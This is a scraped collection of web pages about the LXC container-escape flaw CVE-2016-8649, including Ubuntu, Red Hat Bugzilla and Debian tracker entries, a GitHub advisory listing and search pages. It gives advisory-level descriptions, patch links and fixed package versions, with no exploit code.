[Use-after-free vulnerability in the nsFrameManager::CaptureFrameState function in Mozilla Firefox...](/advisories/GHSA-6vr6-9p4m-qv5v)
Critical

Unreviewed

CVE-2016-5274

was published
May 14, 2022

[Use-after-free vulnerability in the mozilla::a11y::DocAccessible::ProcessInvalidationList...](/advisories/GHSA-rr7w-29gf-6ffp)
Critical

Unreviewed

CVE-2016-5276

was published
May 14, 2022

[Use-after-free vulnerability in the mozilla::nsTextNodeDirectionalityMap::RemoveElementFromMap...](/advisories/GHSA-qcqq-5qh9-xq8v)
Critical

Unreviewed

CVE-2016-5280

was published
May 14, 2022

[Use-after-free vulnerability in the DOMSVGLength class in Mozilla Firefox before 49.0, Firefox...](/advisories/GHSA-465v-39xq-8c56)
Critical

Unreviewed

CVE-2016-5281

was published
May 14, 2022

[Mozilla Firefox before 49.0, Firefox ESR 45.x before 45.4, and Thunderbird < 45.4 rely on...](/advisories/GHSA-2fqh-hxv3-hqmx)
High

Unreviewed

CVE-2016-5284

was published
May 14, 2022

[libpam-pgsql (aka pam\_pgsql) 0.7 does not properly handle a NULL value returned by the password...](/advisories/GHSA-44wh-q63q-2624)
Moderate

Unreviewed

CVE-2013-0191

was published
May 5, 2022

[The gdPngReadData function in libgd 2.0.34 allows user-assisted attackers to cause a denial of...](/advisories/GHSA-2rm4-pxv9-x75c)
Moderate

Unreviewed

CVE-2007-2756

was published
May 1, 2022

[Regular Expression Denial of Service in riot-compiler](/advisories/GHSA-pp4v-55vr-9gxh)
High

CVE-2016-10527

was published
for
riot-compiler

(npm)
Feb 18, 2019

**ProTip!**
Advisories are also available from the
[GraphQL API](https://docs.github.com/graphql/reference/queries#securityadvisories)

[CC-BY-4.0 License](https://docs.github.com/en/github/site-policy/github-additional-product-terms#12-advisory-database)
[Language support](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database#github-reviewed-advisories)
[About GitHub Advisory Database](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from people.canonical.com_7e9b9cda_20250126_010319.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# CVE-2016-8649

Publication date 23 November 2016

Last updated 24 July 2024

---

Ubuntu priority

![](https://assets.ubuntu.com/v1/8010f9e0-CVE-Priority-icon-Medium.svg)

**Medium**

[Why this priority?](/security/cves/about#priority )

## Cvss 3 Severity Score

![](https://assets.ubuntu.com/v1/c96f27b9-CVE-Priority-icon-Critical.svg)

**9.1 · Critical**

[Score breakdown](#impact-score)

Toggle side navigation

Toggle table of contents

* [Description](#description)
* [Status](#status)
* [Severity score breakdown](#impact-score)
* [References](#references)

lxc-attach in LXC before 1.0.9 and 2.x before 2.0.6 allows an attacker
inside of an unprivileged container to use an inherited file descriptor, of
the host's /proc, to access the rest of the host's filesystem via the
openat() family of syscalls.

## Status

Show unmaintained releases

| Package | Ubuntu Release | Status |
| --- | --- | --- |
| lxc | 17.04 zesty | Fixed 2.0.5-0ubuntu4 |
| 16.10 yakkety | Fixed 2.0.5-0ubuntu1.2 |
| 16.04 LTS xenial | Fixed 2.0.5-0ubuntu1~ubuntu16.04.3 |
| 14.04 LTS trusty | Fixed 1.0.8-0ubuntu0.4 |
| 12.04 LTS precise | Ignored end of life |

---

* [How can I get the fixes?](/security/cves/about#security)
* [What do statuses mean?](/security/cves/about#statuses)

## Severity score breakdown

| Parameter | Value |
| --- | --- |
| Base score | 9.1 · Critical |
| Attack vector | Network |
| Attack complexity | Low |
| Privileges required | High |
| User interaction | None |
| Scope | Changed |
| Confidentiality | High |
| Integrity impact | High |
| Availability impact | High |
| Vector | CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H |

## References

* [MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8649)
* [NVD](https://nvd.nist.gov/vuln/detail/CVE-2016-8649)
* [Launchpad](https://launchpad.net/bugs/cve/CVE-2016-8649)
* [Debian](https://security-tracker.debian.org/tracker/CVE-2016-8649)

### Related Ubuntu Security Notices (USN)

+ [USN-3136-1](https://usn.ubuntu.com/USN-3136-1)
+ LXC vulnerability
+ 23 November 2016

### Other references

* <https://www.cve.org/CVERecord?id=CVE-2016-8649>

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from bugzilla.redhat.com_d0b3a969_20250124_121223.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1398242)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1398242)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1398242)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1398242

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1398242**](show_bug.cgi?id=1398242)
(CVE-2016-8649)
- [CVE-2016-8649](https://access.redhat.com/security/cve/CVE-2016-8649) lxc: lxc-attach to malicious container allows access to host

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2016-8649 lxc: lxc-attach to malicious container allows access to host

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED UPSTREAM | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2016-8649 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | high | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1398243](show_bug.cgi?id=1398243 "CLOSED ERRATA - CVE-2016-8649 lxc: lxc-attach to malicious container allows access to host [fedora-all]") [1398245](show_bug.cgi?id=1398245 "CLOSED ERRATA - CVE-2016-8649 lxc: lxc-attach to malicious container allows access to host [epel-all]") | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | | TreeView+ | [depends on](buglist.cgi?bug_id=1398242&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1398242&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2016-11-24 10:40 UTC by Andrej Nemec | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2019-09-29 14:00 UTC ([History](show_activity.cgi?id=1398242)) | | [CC List:](page.cgi?id=fields.html#cclist) | 4 users (show)  karlthered pokorra.mailinglists sagarun thomas.moschny | | Fixed In Version: |  | | | Doc Type: | If docs needed, set a value | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2019-06-08 03:02:40 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1398242#c0)  Andrej Nemec    2016-11-24 10:40:15 UTC  ```  [CVE-2016-8649](https://access.redhat.com/security/cve/CVE-2016-8649) was assigned to the issue that allows an attacker inside of an unprivileged container to use an inherited file descriptor, of the host's /proc, to access the rest of the host's filesystem via the openat() family of syscalls. The file descriptor is needed to write to /proc/<PID>/attr/current or /proc/<PID>/attr/exec to set the AppArmor/SELinux label of the attached process.  Upstream bug:  [https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345)  Upstream patch:  <https://github.com/lxc/lxc/commit/81f466d05f2a89cb4f122ef7f593ff3f279b165c>  References:  <http://seclists.org/oss-sec/2016/q4/515>   ```  [Comment 1](show_bug.cgi?id=1398242#c1)  Andrej Nemec    2016-11-24 10:40:56 UTC  ```  Created lxc tracking bugs for this issue:  Affects: fedora-all [[bug 1398243](show_bug.cgi?id=1398243 "CLOSED ERRATA - CVE-2016-8649 lxc: lxc-attach to malicious container allows access to host [fedora-all]")] Affects: epel-all [[bug 1398245](show_bug.cgi?id=1398245 "CLOSED ERRATA - CVE-2016-8649 lxc: lxc-attach to malicious container allows access to host [epel-all]")]   ```  [Comment 2](show_bug.cgi?id=1398242#c2)  Product Security DevOps Team    2019-06-08 03:02:40 UTC  ``` This CVE Bugzilla entry is for community support informational purposes only as it does not affect a package in a commercially supported Red Hat product. Refer to the dependent bugs for status of those individual community products.   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1398242&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from security-tracker.debian.org_fd10c000_20250126_010322.html ===

# CVE-2016-8649

| **Name** | CVE-2016-8649 |
| --- | --- |
| **Description** | lxc-attach in LXC before 1.0.9 and 2.x before 2.0.6 allows an attacker inside of an unprivileged container to use an inherited file descriptor, of the host's /proc, to access the rest of the host's filesystem via the openat() family of syscalls. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2016-8649) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2016-8649); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2016-8649), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2016-8649), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2016-8649), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2016-8649), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-8649), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2016-8649), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2016-8649), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2016-8649)/[CVE](https://www.suse.com/security/cve/CVE-2016-8649/), GitHub [advisories](https://github.com/advisories?query=CVE-2016-8649)/[code](https://github.com/search?type=Code&q=%22CVE-2016-8649%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2016-8649%22), [web search](https://duckduckgo.com/html?q=%22CVE-2016-8649%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **Debian Bugs** | [845465](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=845465) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [lxc](/tracker/source-package/lxc) ([PTS](https://tracker.debian.org/pkg/lxc)) | bullseye | 1:4.0.6-2+deb11u2 | fixed |
|  | bookworm | 1:5.0.2-1+deb12u3 | fixed |
|  | sid, trixie | 1:6.0.3-1 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [lxc](/tracker/source-package/lxc) | source | jessie | 1:1.0.6-6+deb8u5 |  |  |  |
| [lxc](/tracker/source-package/lxc) | source | (unstable) | 1:2.0.6-1 |  |  | [845465](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=845465) |

## Notes

```
[wheezy] - lxc <no-dsa> (Minor issue)
Fixed by: <https://github.com/lxc/lxc/commit/81f466d05f2a89cb4f122ef7f593ff3f279b165c>
Details: <https://launchpad.net/bugs/1639345>
To be complete this needs as well changes to src:linux

```

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)



=== Content from duckduckgo.com_a972b5a0_20250126_010258.html ===


[DuckDuckGo](/html/)

Unfortunately, bots use DuckDuckGo too.
Please complete the following challenge to confirm this search was made by a human.
Select all squares containing a duck:

![ ](../assets/anomaly/images/challenge/d3840fd63a674ceb9c80e2436f941562.jpg)

![ ](../assets/anomaly/images/challenge/f47662818bba4f8ba9905f6b7fb7aa70.jpg)

![ ](../assets/anomaly/images/challenge/ffd9b913214744bf9a9147758a589934.jpg)

![ ](../assets/anomaly/images/challenge/4855a01208d54730bec25256c4e934a8.jpg)

![ ](../assets/anomaly/images/challenge/ce29e817249f4d1f8d3dbdf3c97f73a3.jpg)

![ ](../assets/anomaly/images/challenge/dc71c97d6c254a33bd7f3546d393bd53.jpg)

![ ](../assets/anomaly/images/challenge/7214b7e37ba3470a80a60db40c289c0e.jpg)

![ ](../assets/anomaly/images/challenge/fb2fad6b1c4f4b7587a3201c6aec817f.jpg)

![ ](../assets/anomaly/images/challenge/970279f153b048b0a2828c7793fd54b0.jpg)

Submit
Images not loading?
Please email the following code to:

error-lite@duckduckgo.com

Code: d4cd0dabcf4caa22ad92fab40844c786

![](//duckduckgo.com/t/tqadb?3728264&s=lite&r=eun&gk=d4cd0dabcf4caa22ad92fab40844c786&i=-1&iadb=0&e=0&sc=1&p=d3840fd63a674ceb9c80e2436f941562-f47662818bba4f8ba9905f6b7fb7aa70-ffd9b913214744bf9a9147758a589934-4855a01208d54730bec25256c4e934a8-ce29e817249f4d1f8d3dbdf3c97f73a3-dc71c97d6c254a33bd7f3546d393bd53-7214b7e37ba3470a80a60db40c289c0e-fb2fad6b1c4f4b7587a3201c6aec817f-970279f153b048b0a2828c7793fd54b0&c=dadb&cc=botnet&o=akyyxbjqSak5vuZk%2Fjr4IrLMrAi46FBUG4FB5oOBZ3%2FTD%2FMPYNOs%2FdWHyiTbwUDg%0A)


=== Content from github.com_323ac1bb_20250126_010300.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DIssues%26q%3D%2522CVE-2016-8649%2522)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

"CVE-2016-8649"

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DIssues%26q%3D%2522CVE-2016-8649%2522)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fsearch&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# issues Search Results · "CVE-2016-8649"

## Filter by

* + [Code... (...)results](https://github.com/search?type=code&q=%22CVE-2016-8649%22)
  + [Repositoriesresults](https://github.com/search?type=repositories&q=%22CVE-2016-8649%22)
  + [Issuesresults](https://github.com/search?type=issues&q=%22CVE-2016-8649%22)
  + [Pull requestsresults](https://github.com/search?type=pullrequests&q=%22CVE-2016-8649%22)
  + [Discussionsresults](https://github.com/search?type=discussions&q=%22CVE-2016-8649%22)
  + [Usersresults](https://github.com/search?type=users&q=%22CVE-2016-8649%22)
  + More
* ### State

  + [Open](https://github.com/search?type=Issues&q=%22CVE-2016-8649%22&state=open)
  + [Closed](https://github.com/search?type=Issues&q=%22CVE-2016-8649%22&state=closed)
* ### Advanced

  + Owner
  + State
  + Close reason
  + [Has linked pull request](https://github.com/search?type=Issues&q=%22CVE-2016-8649%22+linked%3Apr)
  + Author
  + Assignee
  + Mentioned user
  + Mentioned team
  + Commenter
  + Involved user
  + Label
  + Milestone
  + Number of comments
  + Number of interactions
* [Advanced search](https://github.com/search/advanced)
Issues0 (0)0 results  (46 ms)
## 0 results

Sort by:  Best matchFilter
### [mtdev2/worker](/mtdev2/worker)[[DepShield] (CVSS 9.1) Vulnerability due to usage of github.com/lxc:lxd:0.0.0-20190613145114-3dac7136d553](/mtdev2/worker/issues/3)

* ![](https://avatars.githubusercontent.com/in/13833?s=48&v=4)sonatype-depshield[bot]
·* 1
·* Opened  on Mar 21, 2020
·* [#3](/mtdev2/worker/issues/3)
![Issue origami icon](/images/modules/search/issues.png)
## Learn how you can use GitHub Issues to plan and track your work.

Save views for sprints, backlogs, teams, or releases. Rank, sort, and filter issues to suit the occasion. The possibilities are endless.[Learn more about GitHub Issues](https://docs.github.com/issues) ProTip! Restrict your search to the title by using the in:title qualifier.![Issue origami icon](/images/modules/search/issues.png)
## Learn how you can use GitHub Issues to plan and track your work.

Save views for sprints, backlogs, teams, or releases. Rank, sort, and filter issues to suit the occasion. The possibilities are endless.[Learn more about GitHub Issues](https://docs.github.com/issues) ProTip! Press the / key to activate the search input again and adjust your query.

You can’t perform that action at this time.



=== Content from github.com_d81d7c4b_20250126_010319.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DCode%26q%3D%2522CVE-2016-8649%2522)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
